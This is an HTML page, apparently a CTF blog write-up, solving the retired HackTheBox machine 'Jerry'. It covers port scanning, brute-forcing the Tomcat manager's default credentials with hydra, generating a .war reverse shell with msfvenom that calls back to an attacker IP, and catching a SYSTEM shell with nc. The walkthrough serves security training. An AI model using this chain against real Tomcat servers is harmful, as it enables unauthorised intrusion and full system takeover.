@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Jerry</strong></h1>
+        <em>Released: 30th June 2018 / Pwned: September 8th 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Jerry is a simple box to exploit. You log in to Apache Tomcat's management panel using default credentials and upload a .war reverse shell, which drops you right into a SYSTEM shell on the box.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sV -sC -O -oN nmap/initial.txt 10.10.10.95</code><br>
+        <br>
+        -sV service enumeration<br>
+        -sC default scripts<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/jerry#&nbsp;nmap&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap/initial.txt&nbsp;10.10.10.95<br>
+                ...<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                8080/tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;Apache&nbsp;Tomcat/Coyote&nbsp;JSP&nbsp;engine&nbsp;1.1<br>
+                |_http-favicon:&nbsp;Apache&nbsp;Tomcat<br>
+                |_http-server-header:&nbsp;Apache-Coyote/1.1<br>
+                |_http-title:&nbsp;Apache&nbsp;Tomcat/7.0.88<br>
+                Warning:&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;find&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+                Aggressive&nbsp;OS&nbsp;guesses:&nbsp;Microsoft&nbsp;Windows&nbsp;Server&nbsp;2012&nbsp;(91%),&nbsp;Microsoft&nbsp;Windows&nbsp;Server&nbsp;2012&nbsp;or&nbsp;Windows&nbsp;Server&nbsp;2012&nbsp;R2&nbsp;(91%)...<br>
+                No&nbsp;exact&nbsp;OS&nbsp;matches&nbsp;for&nbsp;host&nbsp;(test&nbsp;conditions&nbsp;non-ideal).
+            </div>
+        </div><br>
+        <br>
+        <strong>Ports</strong><br>
+        • 8080/tcp - There's an Apache Tomcat server running.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) Investigate 8080/tcp</strong></h2><br>
+        <code>http://10.10.10.95:8080</code> is an Apache Tomcat default installation page.<br>
+        <br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>2a) Gobuster</strong></h3><br>
+        <code>gobuster</code> will reveal an interesting URL - <code>/manager</code> (if you knew about Tomcat/how it works you wouldn't need to bruteforce for directories)<br>
+            <div class="codebox">
+                root@gotham:~/ctf/jerry/8080#&nbsp;gobuster&nbsp;-e&nbsp;-u&nbsp;http://10.10.10.95:8080&nbsp;-w&nbsp;/usr/share/seclists/Discovery/Web-Content/big.txt&nbsp;-o&nbsp;gb-root-big.txt<br>
+                ...<br>
+                http://10.10.10.95:8080/manager&nbsp;(Status:&nbsp;302)
+            </div>
+        </div><br>
+        <br>
+        <code>/manager/html</code> is the Apache Tomcat admin panel.<br>
+        Credentials are required, but default username/passwords are worth trying.<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) Brute force /manager/html</strong></h2><br>
+        You can bruteforce <a href="http://10.10.10.95:8080/manager/html">http://10.10.10.95:8080/manager/html</a> using metasploit's <code>tomcat_mgr_login</code> module or <code>hydra</code>.<br>
+        <br>
+        I used hydra (with metasploit's wordlists)<br>
+            <div class="codebox">
+                root@gotham:~/ctf/jerry#&nbsp;hydra&nbsp;-L&nbsp;/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt&nbsp;-P&nbsp;/usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt&nbsp;-s&nbsp;8080&nbsp;10.10.10.95&nbsp;http-get&nbsp;/manager/html<br>
+                Hydra&nbsp;v8.9.1&nbsp;(c)&nbsp;2019&nbsp;by&nbsp;van&nbsp;Hauser/THC&nbsp;-&nbsp;Please&nbsp;do&nbsp;not&nbsp;use&nbsp;in&nbsp;military&nbsp;or&nbsp;secret&nbsp;service&nbsp;organizations,&nbsp;or&nbsp;for&nbsp;illegal&nbsp;purposes.<br>
+                <br>
+                Hydra&nbsp;(https://github.com/vanhauser-thc/thc-hydra)<br>
+                [DATA]&nbsp;max&nbsp;16&nbsp;tasks&nbsp;per&nbsp;1&nbsp;server,&nbsp;overall&nbsp;16&nbsp;tasks,&nbsp;42&nbsp;login&nbsp;tries&nbsp;(l:6/p:0),&nbsp;~7&nbsp;tries&nbsp;per&nbsp;task<br>
+                [DATA]&nbsp;attacking&nbsp;http-get://10.10.10.95:8080/manager/html<br>
+                [8080][http-get]&nbsp;host:&nbsp;10.10.10.95&nbsp;&nbsp;&nbsp;login:&nbsp;admin&nbsp;&nbsp;&nbsp;password:&nbsp;admin<br>
+                [8080][http-get]&nbsp;host:&nbsp;10.10.10.95&nbsp;&nbsp;&nbsp;login:&nbsp;tomcat&nbsp;&nbsp;&nbsp;password:&nbsp;s3cret<br>
+                1&nbsp;of&nbsp;1&nbsp;target&nbsp;successfully&nbsp;completed,&nbsp;2&nbsp;valid&nbsp;passwords&nbsp;found<br>
+                Hydra&nbsp;(https://github.com/vanhauser-thc/thc-hydra)&nbsp;finished
+            </div>
+        </div><br>
+        <br>
+        <code>admin/admin</code> doesn't work but <code>tomcat/s3cret</code> does.<br>
+        Visit <a href="http://10.10.10.95:8080/manager/html/">http://10.10.10.95:8080/manager/html/</a> and log in.<br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access/Priv-Esc</strong></h1>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) Upload .war Reverse Shell</strong></h2><br>
+        We now have access to the Apache Tomcat admin panel.<br>
+        From here we can upload a <code>.war</code> reverse shell and get a shell on the system.<br>
+        <br>
+        Generate <code>.war</code> jsp reverse shell using <code>msfvenom</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/jerry#&nbsp;msfvenom&nbsp;-p&nbsp;java/jsp_shell_reverse_tcp&nbsp;LHOST=10.10.14.25&nbsp;LPORT=9001&nbsp;-f&nbsp;war&nbsp;-o&nbsp;lulz.war<br>
+                Payload&nbsp;size:&nbsp;1097&nbsp;bytes<br>
+                Final&nbsp;size&nbsp;of&nbsp;war&nbsp;file:&nbsp;1097&nbsp;bytes<br>
+                Saved&nbsp;as:&nbsp;lulz.war
+            </div>
+        </div><br>
+        <br>
+        Upload your <code>.war</code> reverse shell.<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        <br>
+        You should see your .war file under <em>Applications</em> (mine is <code>lulz</code>)<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        Start a listener on your attacking machine to receive the shell<br>
+            <div class="codebox">
+                root@gotham:~/ctf/jerry/8080#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And run your uploaded .war by visiting to link to you reverse shell under <em>Applications</em>.<br>
+        You should get dropped straight into a SYSTEM shell!<br>
+            <div class="codebox">
+                ...<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.25]&nbsp;from&nbsp;(UNKNOWN)&nbsp;[10.10.10.95]&nbsp;49192<br>
+                Microsoft&nbsp;Windows&nbsp;[Version&nbsp;6.3.9600]<br>
+                (c)&nbsp;2013&nbsp;Microsoft&nbsp;Corporation.&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                C:\apache-tomcat-7.0.88&gt;whoami<br>
+                whoami<br>
+                nt&nbsp;authority\system
+            </div>
+        </div><br>
+        <br>
+        You can grab <code>user.txt</code> and <code>root.txt</code> from <code>C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt</code><br>
+            <div class="codebox">
+                C:\apache-tomcat-7.0.88&gt;type&nbsp;"C:\Users\Administrator\Desktop\flags\2&nbsp;for&nbsp;the&nbsp;price&nbsp;of&nbsp;1.txt"<br>
+                type&nbsp;"C:\Users\Administrator\Desktop\flags\2&nbsp;for&nbsp;the&nbsp;price&nbsp;of&nbsp;1.txt"<br>
+                user.txt<br>
+                7004d...<br>
+                <br>
+                root.txt<br>
+                04a8b...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
